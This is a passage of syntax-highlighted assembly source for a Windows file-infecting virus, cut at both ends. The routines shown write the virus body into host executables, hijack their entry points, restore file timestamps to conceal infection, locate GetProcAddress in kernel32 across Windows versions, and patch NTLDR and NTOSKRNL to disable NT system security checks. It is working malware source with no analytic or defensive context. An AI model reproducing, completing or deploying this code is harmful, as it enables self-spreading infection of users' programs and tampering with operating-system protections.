             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">i_VirusOffset</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Phys_VSize</span><span class="sc0">            </span><span class="sc1">; increase phys. size</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">i_FileHandle</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">MapFile</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_CloseFile</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">i_MapHandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">ViewMap</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_CloseMap</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer3</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; write header</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">HostCode</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">i_EP_Offset</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; set up call gs:Virus</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00E8659090</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">i_HostDep32</span><span class="sc0">
             </span><span class="sc6">stosd</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">; fill with blanks</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">i_FileSize</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">i_VirusOffset</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jna</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IN_05</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">IN_05</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                   </span><span class="sc1">; write vrs</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">i_VirusOffset</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VSize</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Phys_VSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">IN_CloseMap</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">i_MapHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CloseHandle</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">Wait_A_Little</span><span class="sc0">

</span><span class="sc5">IN_CloseFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; restore file time</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">i_FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">SetFileTime</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">i_FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">IN_Exit</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">InfectFile</span><span class="sc0">                </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; -------------------   GetProcAddress Search Routine   ------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">Whereis_GPA</span><span class="sc0">               </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">w_Kernel32</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc10">USES</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">GPA_Sigs</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OS</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">w_Kernel32</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFF00000</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0BFF00000</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OS_WinNT?</span><span class="sc0">

</span><span class="sc5">OS_Win9x</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0BFF70000</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WG_00</span><span class="sc0">

</span><span class="sc5">OS_WinNT?</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OS</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">077F00000</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OS_Win2K?</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WG_00</span><span class="sc0">

</span><span class="sc5">OS_Win2K?</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OS</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">077E00000</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WG_Failed</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">077E80000</span><span class="sc0">

</span><span class="sc5">WG_00</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">20000</span><span class="sc0">

</span><span class="sc5">WG_01</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">cmpsb</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WG_02</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">WG_01</span><span class="sc0">

</span><span class="sc5">WG_Failed</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WG_03</span><span class="sc0">

</span><span class="sc5">WG_02</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">GetProcAddress</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Kernel32_Base</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">WG_03</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Whereis_GPA</span><span class="sc0">               </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------   DLL Functions Relocation Routine   ----------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">DLL_Relocate</span><span class="sc0">              </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">DLL_Base</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">DLL_Func</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">

</span><span class="sc10">USES</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">


             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">DLL_Func</span><span class="sc0">

</span><span class="sc5">DR_00</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">DLL_Base</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetProcAddress</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">DR_03</span><span class="sc0">

</span><span class="sc5">DR_01</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">

</span><span class="sc5">DR_02</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">lodsb</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">DR_02</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">DR_00</span><span class="sc0">

</span><span class="sc5">DR_03</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">DLL_Relocate</span><span class="sc0">              </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ---------------------   NT Security Patch Routine   --------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">BlownAway</span><span class="sc0">                 </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">DirEnd</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">            
</span><span class="sc10">USES</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                
                                          

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">NTLDR</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">DirEnd</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">
             </span><span class="sc6">movsd</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">NT4_NTLDR</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OS</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">BA_00</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">BA_00</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">05</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">PatchFile</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">NTOSKRNL</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">DirEnd</span><span class="sc0">

</span><span class="sc5">BA_01</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">BA_01</span><span class="sc0">

             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">NT4_NTOSKRNL</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OS</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">BA_02</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">BA_02</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">09</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">PatchFile</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">BlownAway</span><span class="sc0">                 </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; -------------------------   File Patch Routine   ------------------------ ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">PatchFile</span><span class="sc0">                 </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">p_Filename</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">p_PatchAddr</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">p_PatchSize</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">

</span><span class="sc9">LOCAL</span><span class="sc0">        </span><span class="sc5">p_FileHandle</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">p_FileSize</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">p_MapHandle</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">


</span><span class="sc10">USES</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">p_Filename</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">03</span><span class="sc0">           </span><span class="sc1">; open existing</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">OpenFile</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">PA_Exit</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">p_FileHandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetFileSize</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">p_FileSize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">p_FileHandle</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">MapFile</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">PA_CloseFile</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc5">p_MapHandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">ViewMap</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">PA_CloseMap</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">p_PatchAddr</span><span class="sc0">
